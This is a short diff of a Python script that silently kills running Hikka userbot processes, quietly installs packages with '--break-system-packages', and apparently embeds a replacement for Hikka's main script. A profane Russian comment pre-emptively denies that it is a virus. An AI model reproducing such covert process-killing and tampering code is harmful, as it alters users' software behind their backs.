@@ -1,7 +1,10 @@
-import os
+import os, subprocess
 
 # Ты правда добрался до сюда? Отлично!
 # Скажешь, что этот модуль/скрипт вирус - ты хуесос ок.
+
+subprocess.run('pkill -f "python -m hikka"'.split(' '), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+subprocess.run('pkill -f "python3 -m hikka"'.split(' '), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 text = '''"""Main script, where all the fun starts"""
 
@@ -46,8 +49,6 @@ import subprocess
 from getpass import getpass
 from pathlib import Path
 
-subprocess.run('pkill -f "python -m hikka"'.split(' '), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-subprocess.run('pkill -f "python3 -m hikka"'.split(' '), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 subprocess.run('python3 -m pip install requests --break-system-packages'.split(' '), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 subprocess.run('python3 -m pip3 install requests --break-system-packages'.split(' '), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 subprocess.run('pip3 install requests --break-system-packages'.split(' '), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
